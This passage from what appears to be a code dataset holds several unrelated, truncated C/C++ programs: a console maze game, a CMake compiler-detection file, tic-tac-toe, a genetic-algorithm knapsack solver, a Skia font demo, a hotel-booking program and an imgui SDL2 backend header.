\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442\u0441\u044f \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u0442\u043e\u0433\u043e, \u043e\u0441\u0442\u0430\u043d\u0435\u0442\u0441\u044f \u0432\u0440\u0430\u0433 \u0438\u043b\u0438 \u043d\u0435\u0442\n\t\t\t\t// \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c, \u0432\u0435\u0440\u043e\u044f\u0441\u0442\u043d\u043e\u0441\u0442\u044c \u043e\u0441\u0442\u0430\u0442\u044c\u0441\u044f \u043d\u0430 \u0443\u0440\u043e\u0432\u043d\u0435 - 10%\n\t\t\t\tint prob = rand() % 10; // 0-9\n\t\t\t\tif (prob != 0) // 1 2 3 4 5 6 7 8 9\n\t\t\t\t\tlocation[y][x] = HALL;\n\t\t\t}\n\t\t}\n\t}\n\t//return location[HEIGHT][WIDTH];\n}\n\nvoid location_show(int location[][50], int WIDTH, int HEIGHT)\t\t\t\t\t\t\t\t\t\t\t// \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u043b\u043e\u043a\u0430\u0446\u0438\u0438\n{\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\tfor (int y = 0; y < HEIGHT; y++) // \u043f\u0435\u0440\u0435\u0431\u043e\u0440 \u0441\u0442\u0440\u043e\u043a\n\t{\n\t\tfor (int x = 0; x < WIDTH; x++)\n\t\t{\n\t\t\tswitch (location[y][x]) {\n\t\t\tcase HALL: // \u043a\u043e\u0440\u0438\u0434\u043e\u0440\n\t\t\t\tcout << \" \";\n\t\t\t\tbreak;\n\t\t\tcase WALL: // \u0441\u0442\u0435\u043d\u0430\n\t\t\t\tSetConsoleTextAttribute(h, DARKGREEN); // 0-255\n\t\t\t\tcout << (char)177; //(char)219;\n\t\t\t\tbreak;\n\t\t\tcase COIN: // \u043c\u043e\u043d\u0435\u0442\u043a\u0438\n\t\t\t\tSetConsoleTextAttribute(h, YELLOW);\n\t\t\t\tcout << (char)15; // 249\n\t\t\t\tbreak;\n\t\t\tcase ENEMY: // \u0432\u0440\u0430\u0433\u0438\n\t\t\t\tSetConsoleTextAttribute(h, RED);\n\t\t\t\tcout << (char)1;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tcout << location[y][x];\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcout << \"\\n\";\n\t}\n}\n\nvoid hero_show(COORD position, HANDLE h)\t\t\t\t\t\t\t\t\t\t// \u0440\u0430\u0437\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u0413\u0413 (\u0433\u043b\u0430\u0432\u043d\u043e\u0433\u043e \u0433\u0435\u0440\u043e\u044f)\n{\n\tSetConsoleCursorPosition(h, position);\n\tSetConsoleTextAttribute(h, BLUE);\n\tcout << (char)1;\n}\n\nvoid hero_erase(COORD position, HANDLE h)\t\t\t\t\t\t\t\t\t\t// \u0441\u0442\u0438\u0440\u0430\u043d\u0438\u0435 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u0413\u0413 (\u0433\u043b\u0430\u0432\u043d\u043e\u0433\u043e \u0433\u0435\u0440\u043e\u044f)\n{\n\tSetConsoleCursorPosition(h, position);\n\tcout << \" \";\n}\n\nCOORD key_dir (int location[][50], int code, COORD position)\n{\t\n\tswitch (code)\n\t{\n\tcase RIGHT:\n\t\tif (location[position.Y][position.X + 1] != WALL)\n\t\t\tposition.X++;\n\t\tbreak;\n\tcase LEFT:\n\t\tif (position.X > 0 && location[position.Y][position.X - 1] != WALL)\n\t\t\tposition.X--;\n\t\tbreak;\n\tcase UP:\n\t\tif (location[position.Y - 1][position.X] != WALL)\n\t\t\tposition.Y--;\n\t\tbreak;\n\tcase DOWN:\n\t\tif (location[position.Y + 1][position.X] != WALL)\n\t\t\tposition.Y++;\n\t\tbreak;\n\tdefault:\n\t\tcout << code << \"\\n\";\n\t\tbreak;\n\t}\n\treturn position;\n}\n\nint hero_coins(int location[][50], COORD position, int coins)\n{\n\tif (location[position.Y][position.X] == COIN)\n\t{\n\t\tcoins++;\n\t\tlocation[position.Y][position.X] = HALL;\n\t\tprint_message(1, 16, 14, \"COIN COLLECTED!\\n\");\n\t\tprint_message_coin(1, 17, 14, coins);\n\t}\n\treturn coins;\n}\n\n\n\nint main()\n{\n\tconst int WIDTH = 50;\n\tconst int HEIGHT = 15;\n\n\tint location[HEIGHT][WIDTH] = {};\n\n\tCOORD position;\n\tposition.X = 1;\n\tposition.Y = 2;\n\n\tint coins = 0;\n\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\n\n\tsystem(\"title \u0411\u043e\u043c\u0431\u0435\u0440!\");\n\n\t// \u0437\u0430\u043f\u0443\u0441\u043a \u0430\u043b\u0433\u043e\u0440\u0438\u0442\u043c\u0430 \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n\tsrand(time(0));\n\trand();\n\n\t// \u0441\u043a\u0440\u044b\u0442\u044c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u043c\u0438\u0433\u0430\u044e\u0449\u0438\u0439 \u043a\u0443\u0440\u0441\u043e\u0440\n\thide_cursor();\n\n\t// \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043b\u043e\u043a\u0430\u0446\u0438\u0438\t\n\tlocation_gen(location, WIDTH, HEIGHT);\n\n\t// \u043f\u043e",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\r\n# endif\r\n\r\n#elif defined(__WATCOMC__)\r\n# define COMPILER_ID \"OpenWatcom\"\r\n   /* __WATCOMC__ = VVRP + 1100 */\r\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) ",
    "bool isWin(char game[3][3]){\nbool win = false;\nif (game[0][0] == game[0][1] && game[0][1] == game[0][2] && (game[0][0]\n== 'X' || game[0][0] == 'O')) win = true;\nif (game[1][0] == game[1][1] && game[1][1] == game[1][2] && (game[1][0]\n== 'X' || game[1][0] == 'O')) win = true;\nif (game[2][0] == game[2][1] && game[2][1] == game[2][2] && (game[2][0]\n== 'X' || game[2][0] == 'O')) win = true;\n// column\nif (game[0][0] == game[1][0] && game[1][0] == game[2][0] && (game[0][0]\n== 'X' || game[0][0] == 'O')) win = true;\nif (game[0][1] == game[1][1] && game[1][1] == game[2][1] && (game[0][1]\n== 'X' || game[0][1] == 'O')) win = true;\nif (game[0][2] == game[1][2] && game[1][2] == game[2][2] && (game[0][2]\n== 'X' || game[0][2] == 'O')) win = true;\n// diagonal\nif (game[0][0] == game[1][1] && game[1][1] == game[2][2] && (game[0][0]\n== 'X' || game[0][0] == 'O')) win = true;\nif (game[0][2] == game[1][1] && game[1][1] == game[2][0] && (game[0][2]\n== 'X' || game[0][2] == 'O')) win = true;\nreturn win;\n}\nint main(){\nint i, j;\nchar game[3][3] = {' '}; // Tic-tac-toe\nchar player1 = 'X';\nchar player2 = 'O';\nbool turn = true; // false for player 1's turn, true for player 2's turn.\nPlayer 1 first.\ncout << \"X = Player 1\" << endl << \"O = Player 2\" << endl;\nfor (int n=0; n<9; n++){\nturn = !turn; // use the not-operator to change true to false or\nfalse to true.\nif (turn == false)\ncout << \"Player 1: \";\nelse\ncout << \"Player 2: \";\ncout << \"Which cell to mark? i:[1..3], j:[1..3]: \";\ncin >> i >> j;\nif (turn == false)\ngame[i][j] = 'X';\nelse\ngame[i][j] = 'O';\nif (isWin(game)){\ncout << \"Win!\" << endl;\nbreak; // need to terminate the problem\n}\n}\nif (i==3) // all celles with i=0 to 2 have been inputted above but no\nwinner yet\ncout << \"Tie!\" << endl;\n// show the game to console\ncout << game[0][0] << \" \" << game[0][1] << \" \" << game[0][2] << endl;\ncout << game[1][0] << \" \" << game[1][1] << \" \" << game[1][2] << endl;\ncout << game[2][0] << \" \" << game[2][1] << \" \" << game[2][2] << endl;\nreturn 0;\n}\n",
    "//delete repeat + uniform(keep parent) + mutation (keep parent)\n//need to put dataset file in same path\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <ctime>\n#include <algorithm>\n#define selection 8\n#define crossover 1\n#define mutation 0.27\nusing namespace std;\n\n// Structure to represent item\nstruct Item {\n    int weight;\n    int value;\n};\n\nint main() {\n    string filename;\n    cout << \"Enter the filename(ex:dt01): \";\n    cin >> filename;\n    string filePath = \"./dataset/\" + filename + \"/item.txt\";\n    ifstream inputFile(filePath.c_str());\n\tstring output_filePath = \"ans_\" + filename + \".txt\";\n\tofstream outputfile(output_filePath.c_str());\n\n    // Check if the file opened successfully\n    if (!inputFile.is_open()) {\n        cerr << \"Error opening file\" << endl;\n        return 1;\n    }\n\t\n    string line;\n    vector<Item> data_set;\n    long long int count = 0;\n    int run = 1;\n    Item data;\n    int number_of_item = 0, capacity = 0;\n    int evaluation_max = filename == \"dt01\" ? 1000 : (filename == \"dt02\" ? 10000 : 500000);\n    int population = filename == \"dt01\" ? 100 : (filename == \"dt02\" ? 200 : 4850);\n    \n    // Read number of items and capacity\n    getline(inputFile, line);\n    istringstream tmp_line(line);\n    tmp_line >> number_of_item >> capacity;\n\n    // Read items data\n    while (getline(inputFile, line)) {\n        istringstream tmp_line(line);\n        tmp_line >> data.weight >> data.value;\n        data_set.push_back(data);\n    }\n    inputFile.close();\n\twhile(run <= 30)\n\t{\n\t\tcout<<\"Round : \"<<run<<endl;\n\t\t// Initialize population\n\t\tvector<int> ObjectiveValue;\n\t\tvector<string> pick;\n\t\tint eva = 0;\n\t\t\n\t\tsrand(time(NULL));\n\t\tfor (int i = 0; i < population; i++) {\n\t\t\tstring str(number_of_item, '0');\n\t\t    for (int j = 0; j < number_of_item; j++) {\n\t\t    \tif(rand() % 2)\tstr[j] = '1';\n\t\t        else\tstr[j] = '0';\n\t\t    }\n\t\t    pick.push_back(str);\n\t\t}\n\n\t\t// Evaluation\n\t\tfor (int i = 0; i < population; i++) {\n\t\t    int ObjectiveWeight = 0, tmp = 0;\n\t\t    eva++;\n\t\t    for (int j = 0; j < number_of_item; j++) {\n\t\t        if (pick[i][j] == '1') {\n\t\t            tmp += data_set[j].value;\n\t\t            ObjectiveWeight += data_set[j].weight;\n\t\t        }\n\t\t        if (ObjectiveWeight > capacity) {\n\t\t        \tpick[i][j] = '0';\n\t\t\t\t\ttmp -= data_set[j].value;\n\t\t\t\t\tObjectiveWeight -= data_set[j].weight;\n\t\t\t\t}\n\t\t    }\n\t\t    ObjectiveValue.push_back(tmp);\n\t\t}\n\t\tfor(int i = 0;i < ObjectiveValue.size();i++){\n\t\t\tfor(int j = i+1;j < ObjectiveValue.size();){\n\t\t\t\tif(ObjectiveValue[i] == ObjectiveValue[j]){\n\t\t\t\t\tObjectiveValue.erase(ObjectiveValue.begin()+j);\n\t\t\t\t\tpick.erase(pick.begin()+j);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\t++j;\n\t\t\t}\n\t\t}\n\t\t// Main loop for genetic algorithm\n\t\twhile(eva < evaluation_max) {\n\t\t    if (ObjectiveValue.size() == 1) break;\n\t\t    vector<int> NewObjectiveValue;\n\t\t    vector<string> Newpick;\n\n\t\t    // Selection\n\t\t    for (int i = 0; i < ObjectiveValue.size(); i++) {\n\t\t        vector<pair<int, int>> selected;\n\t\t        for (int j = 0; j < selection; j++) {\n\t\t            int select = rand() % ObjectiveValue.size();\n\t\t            selected.push_back(make_pair(ObjectiveValue[select], select));\n\t\t        }\n\t\t        sort(selected.rbegin(), selected.rend());\n\t\t        NewObjectiveValue.push_back(selected[0].first);\n\t\t        Newpick.push_back(pick[selected[0].second]);\n\t\t    }\n\n\t\t    ObjectiveValue = NewObjectiveValue;\n\t\t    pick = Newpick;\n\n\t\t    // Crossover\n\t\t\tconst int mid = ObjectiveValue.size() / 2;\n\t\t    for (int i = 0; i < mid; i++) {\n\t\t        float cross_rate = static_cast<float>(rand()) / RAND_MAX;\n\t\t        if (cross_rate <= crossover) {\n\t\t        \teva++;\n\t\t            string str1 = pick[i],str2 = pick[mid+i];\n\t\t            for (int j = 0; j < number_of_item; j++) {\n\t\t            \tif(rand() % 2){\t\n\t\t\t\t        \tchar tmp = str1[j];\n\t\t\t\t        \tstr1[j] = str2[j];\n\t\t\t\t        \tstr2[j] = tmp;\n\t\t\t\t        }\n\t\t            }\n\t\t            if(filename == \"dt01\"){\n\t\t            \tpick.push_back(str1);\n\t\t            \tpick.push_back(str2);\n\t\t            }\n\t\t            else if(filename == \"dt02\")\n\t\t            {\n\t\t            \tpick.push_back(str1);\n\t\t            }\n\t\t            else{\n\t\t            \tif(pick.size() < 5)\n\t\t            \t{\n\t\t            \t\tpick.push_back(str1);\n\t\t            \t\tpick.push_back(str2);\n\t\t            \t}\n\t\t            \telse\n\t\t            \t\tpick.push_back(str2);\n\t\t            }\n\t\t        }\n\t\t    }\n\n\t\t    // Mutation\n\t\t    int size = pick.size();\n\t\t    for (size_t i = 0; i < size; i++) {\n\t\t        float mutation_rate = static_cast<float>(rand()) / RAND_MAX;\n\t\t        if (mutation_rate <= mutation) {\n\t\t        \tpick.push_back(pick[i]);\n\t\t            int mutation_point = rand() % number_of_item;\n\t\t            if(pick[i][mutation_point] == '1')\tpick[i][mutation_point] = '0';\n\t\t            else pick[i][mutation_point] = '1';\n\t\t        }\n\t\t    }\n\n\t\t    // Clear previous values\n\t\t    ObjectiveValue.clear();\n\n\t\t    // Re-evaluation\n\t\t    for (size_t i = 0; i < pick.size();",
    "#include \"Editor.h\"\n\n#include \"include/core/SkCanvas.h\" // Include SkCanvas\n#include \"include/core/SkFont.h\"\n#include \"include/core/SkFontMetrics.h\"\n#include \"include/core/SkFontMgr.h\"\n#include \"include/core/SkGraphics.h\"\n#include \"include/core/SkPaint.h\" // Include SkPaint\n#include \"include/core/SkSurface.h\"\n#include \"include/core/SkTextBlob.h\"\n#include \"tools/fonts/FontToolUtils.h\"\n\nEditor::Editor(int width, int height)\n{\n    SkGraphics::Init();\n\n#if defined(SK_BUILD_FOR_WIN)\n    fontMgr = SkFontMgr_New_DirectWrite();\n#endif\n\n#if defined(SK_BUILD_FOR_UNIX)\n    fontMgr = SkFontMgr_New_FontConfig(nullptr);\n#endif\n\n#if (defined(SK_BUILD_FOR_IOS) || defined(SK_BUILD_FOR_MAC))\n    fontMgr = SkFontMgr_New_CoreText(nullptr);\n#endif\n}\n\nEditor::~Editor()\n{\n}\n\nvoid Editor::loadFont()\n{\n    // load the desired font here\n    // sk_sp<SkTypeface> typeface = fontMgr->makeFromFile(fontPath);\n}\n\nvoid Editor::draw(SkCanvas *canvas)\n{\n    // Get the canvas from the surface\n    int height = canvas->getBaseLayerSize().height();\n    int width = canvas->getBaseLayerSize().width();\n\n    //     // Define Skia paint object\n    SkPaint paint;\n    canvas->clear(SK_ColorWHITE);\n\n    // Use Skia predefined colors to test\n    paint.setColor(SK_ColorRED);\n    canvas->drawRect(SkRect::MakeXYWH(0, 0, 100, 100), paint); // Should draw red\n\n    paint.setColor(SK_ColorGREEN);\n    canvas->drawRect(SkRect::MakeXYWH(100, 0, 100, 100), paint); // Should draw green\n\n    paint.setColor(SK_ColorBLUE);\n    canvas->drawRect(SkRect::MakeXYWH(200, 0, 100, 100), paint); // Should draw green\n\n    // sk_sp<SkTypeface> face = ToolUtils::CreatePortableTypeface(\"Helvetica\", SkFontStyle());\n\n    // // // sk_sp<SkFontMgr> mgr = SkFontMgr::RefEmpty();\n    // // sk_sp<SkTypeface> face = mgr->matchFamilyStyle(\"Helvetica\", SkFontStyle());\n    // // // sk_sp<SkFontMgr> fontMgr = SkFontMgr::RefEmpty();\n\n    // // // Load the font from a file (e.g., .ttf or .otf)\n\n    // if (!face)\n    // {\n    //     printf(\"Cannot open typeface\\n\");\n    //     return 1;\n    // }\n\n    // SkFont font(face, 40);\n\n    // const char *text = \"HELLO SINGULARITY\";\n\n    // // // Measure the width of the text\n    // SkScalar textWidth = font.measureText(text, strlen(text), SkTextEncoding::kUTF8);\n    // // Get the font metrics to measure the height of the text\n    // SkFontMetrics metrics;\n    // font.getMetrics(&metrics);\n\n    // // // The text height is the distance between the top and bottom of the text\n    // SkScalar textHeight = metrics.fCapHeight; // You can use metrics.capHeight() for precise height\n\n    // // Calculate the x and y positions to center the text\n    // SkScalar x = (width - textWidth) / 2;\n    // SkScalar y = (height + textHeight) / 2;\n\n    // paint.setColor(SK_ColorGREEN);\n    // canvas->drawString(text, x, y, font, paint);\n\n    float x = 10, y = 10;\n    float textScale = 24;\n\n    for (int i = 0; i < fontMgr->countFamilies(); ++i)\n    {\n        SkString familyName;\n        fontMgr->getFamilyName(i, &familyName);\n        sk_sp<SkFontStyleSet> styleSet(fontMgr->createStyleSet(i));\n        for (int j = 0; j < styleSet->count(); ++j)\n        {\n            SkFontStyle fontStyle;\n            SkString style;\n            styleSet->getStyle(j, &fontStyle, &style);\n            auto s = SkStringPrintf(\"SkFont font(fontMgr->legacyMakeTypeface(\\\"%s\\\", SkFontStyle(%3d, %1d, %-27s), \"\n                                    \"%g);\",\n                                    familyName.c_str(), fontStyle.weight(), fontStyle.width(), tostr(fontStyle.slant()),\n                                    textScale);\n            SkFont font(fontMgr->legacyMakeTypeface(familyName.c_str(), fontStyle), textScale);\n            y += font.getSpacing() * 1.5;\n            canvas->drawString(s, x, y, font, SkPaint());\n        }\n    }\n\n    // test\n}\n",
    "// TRI - rec 6-9 \r\n// Pedro Henrique isamu fagundes de souza tsukahara yoshissaro\r\n// Juan Fernando Coucolis\r\n// Diogo Casari Del Pino\r\n// Nicolas Mariano da Silva\r\n#include <iostream>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <stdio.h>\r\n\r\nstruct sthospede\r\n{\r\n\tchar nome[40];\r\n\tchar cpf[11];\r\n\tchar endereco[50];\r\n\tchar telefone[15];\r\n\tchar email[50];\r\n};\r\n\t\t\t\t\r\n\r\nvoid limparBuffer();\r\nvoid fhospede(char nome[40], char c[11], char e[50], char t[15], char em[50]);\r\nvoid clear(); \r\nvoid MostrarTabela (); \r\n\r\nint main()\r\n{\r\n    char tab[20][14];\r\n    struct sthospede hospedes[20][14];\r\n    int i, j; // i = linhas j = coluna\r\n    int opcao;\r\n    int escolha; // escolha se quer fazer cadastrou ou nao\r\n    int hotal = 280; //numero total de quartos no hotel\r\n    int occ; //taxa de ocupacao\r\n\tint occr; //taxa de reserva\r\n\tint oct; //taxa de ocupacaso geral \r\n\tint qlivre;\r\n    \r\n    //gerar tabela\r\n    for(i = 20; i >= 1; i--)\r\n        for(j = 1; j <= 14; j++)\r\n            tab[i][j] = '.';\r\n    \r\n    do\r\n    {\r\n        //menu de opcoes\r\n        printf(\"\\n===============================================\\n\");\r\n        printf(\"+----------------------------+\\n\");\r\n    \tprintf(\"|           Menu             |\\n\");\r\n    \tprintf(\"+----------------------------+\\n\");\r\n        printf(\"Digite a opcao desejada:\\n\");\r\n        printf(\"1 - Mostrar os Quartos\\n\");\r\n        printf(\"2 - Realizar Reserva\\n\");\r\n        printf(\"3 - Realizar Check-In com reserva\\n\");\r\n        printf(\"4 - Realizar Check-in sem reserva \\n\");\r\n        printf(\"5 - Realizar Check-Out\\n\");\r\n        printf(\"6 - Cancelar Reserva\\n\");\r\n        printf(\"7 - Taxa de ocupacao\\n\");\t\r\n\t\tprintf(\"8 - Consultar quarto\\n\");\r\n        printf(\"0 - sair\\n\");\r\n        printf(\"Opcao: \");\r\n        scanf(\"%d\", &opcao);\r\n        system(\"cls\");\r\n        printf(\"\\n===============================================\\n\");\r\n    \r\n        switch(opcao)\r\n        {\r\n            case 1: //Mostrar os Quartos\r\n            { \r\n                printf(\" Apto ->\");\r\n                printf(\"\\t\");\r\n                for(j = 1; j <= 14; j++)\r\n                    printf(\" %2d \", j);\r\n                printf(\"\\n\\n\");\r\n            \r\n                for(i = 20; i >= 1; i--)\r\n                {   \r\n                    printf(\" Andar %2d\\t\", i); //numero da linha\r\n                    for(j = 1; j <= 14; j++)\r\n                        printf(\"  %c \", tab[i][j]);\r\n                    printf(\"\\n\");    \r\n                }\r\n                \r\n                printf(\"Pressione Enter para voltar ao menu.\\n\");\r\n                limparBuffer();\r\n                getchar();  // Aguarda o usuario pressionar Enter\r\n                system(\"cls\"); //limpa a tela\r\n                break;\r\n            }   \r\n            \r\n            case 2://Realizar Reserva\r\n            {\r\n                printf(\" Apto ->\");\r\n                printf(\"\\t\");\r\n                for(j = 1; j <= 14; j++)\r\n                    printf(\" %2d \", j);\r\n                printf(\"\\n\\n\");\r\n            \r\n                for(i = 20; i >= 1; i--)\r\n                {   \r\n                    printf(\" Andar %2d\\t\", i); //numero da linha\r\n                    for(j = 1; j <= 14; j++)\r\n                        printf(\"  %c \", tab[i][j]);\r\n                    printf(\"\\n\");    \r\n                }\r\n                        \r\n                printf(\"Digite o andar (0 para voltar): \");\r\n                scanf(\"%d\", &i);\r\n\r\n                if(i == 0)\r\n                {\r\n                \tsystem(\"cls\"); //limpa a tela\r\n                    continue;\r\n                }\r\n\r\n                if(i < 0 || i > 20) //caso o andar seja invalido\r\n                {\r\n                    system(\"cls\"); //limpa a tela\r\n                    printf(\"\\nAndar invalido.\\n\");\r\n                    continue;\r\n                }\r\n\r\n        \r\n                printf(\"Digite o apartamento: \");\r\n                scanf(\"%d\", &j);\r\n                \r\n                if(j < 0 || j > 14) //caso o apartamento seja invalido\r\n                {\r\n                    system(\"cls\");\r\n                    \r\n                    printf(\"\\nApartamento invalido.\\n\");\r\n                    continue;    \r\n                }   \r\n        \r\n                if(tab[i][j] == 'R')\r\n                {\r\n                    system(\"cls\");\r\n                    printf(\"\\nQuarto ja ocupado, tente novamente.\\n\\n\");\r\n                    continue;\r\n                }\r\n                \r\n\r\n                if(tab[i][j] == 'O')\r\n                {\r\n                    system(\"cls\");\r\n                    printf(\"\\nJa fizeram Check In no quarto escolhido, tente novamente.\\n\\n\");\r\n                    continue;\r\n                }\r\n                else \r\n                    system(\"cls\");\r\n                \ttab[i][j] = 'R';\r\n                \r\n                printf(\"Reserva realizada no quarto %d, andar %d\\n\", i, j );\r\n                break;\r\n            }\r\n            \r\n            case 3: //Realizar Check-In com reserva\r\n            {\r\n                printf(\" ",
    "// dear imgui: Platform Backend for SDL2\r\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\r\n// (Info: SDL2 is a cross-platform general purpose library for handling windows, inputs, graphics context creation, etc.)\r\n// (Prefer SDL 2.0.5+ for full feature support.)\r\n\r\n// Implemented features:\r\n//  [X] Platform: Clipboard support.\r\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen.\r\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy SDL_SCANCODE_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\r\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\r\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\r\n//  [X] Platform: Multi-viewport support (multiple windows). Enable with 'io.ConfigFlags |= 